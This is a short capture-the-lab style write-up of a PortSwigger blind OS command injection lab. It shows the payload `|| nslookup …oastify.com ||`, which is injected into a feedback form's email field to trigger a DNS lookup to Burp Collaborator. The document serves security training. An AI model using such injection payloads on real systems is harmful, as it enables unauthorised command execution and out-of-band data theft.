---
author: Nithissh S
pubDatetime: 2024-10-15T15:22:00Z
modDatetime: 2024-10-15T09:12:47.400Z
title: Blind OS command injection with out-of-band interaction
slug: os-portswigger-lab-1
featured: false
draft: false
tags:
  - BSCP
  - Command Injection
description:
  This lab contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain. To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.    
---

## Objective 

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the blind OS command injection vulnerability to issue a DNS lookup to Burp Collaborator.

## Solution 

Just like the other lab, we have a feedback submission form 

![](../../assets/images/bscp/os/os-10.png)

We know that email field is vulnerable to OS command injectiion and in order to solve the lab we need to get the pingback from the server through the collaborator and utilising the following payload `|| nslookup cxd2y4s3h3mgzbw27bjospudj4pvdl1a.oastify.com ||` 

Now place the following payload into the email parameter... url encode, sent the request and response as expected without an error 

![](../../assets/images/bscp/os/os-11.png)

Checking the collaborator, we got a DNS pingback 

![](../../assets/images/bscp/os/os-12.png)

As mentioned in lab description, We got the DNS pingback and that solves the lab 